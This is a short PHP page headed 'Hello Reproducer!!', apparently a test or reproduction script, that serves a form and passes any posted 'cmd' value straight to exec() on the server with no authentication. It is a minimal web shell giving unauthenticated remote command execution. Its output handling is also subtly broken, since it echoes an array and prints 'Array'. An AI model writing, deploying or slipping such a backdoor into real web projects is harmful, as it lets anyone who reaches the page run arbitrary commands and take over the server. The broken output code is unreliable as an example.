<?php

function bg_exec($cmd)
{
    exec($cmd.' > /dev/null &');
}

echo "Hello Reproducer!!";

if (isset($_POST['cmd'])) {
    exec($_POST['cmd'], $output);
    echo '<pre>';
    echo $output.PHP_EOL;
    echo '</pre>';
}

?>
<hr>
<form action="/" method="post">
    <input type="text" name="cmd">
    <button type="submit">exec</button>
</form>
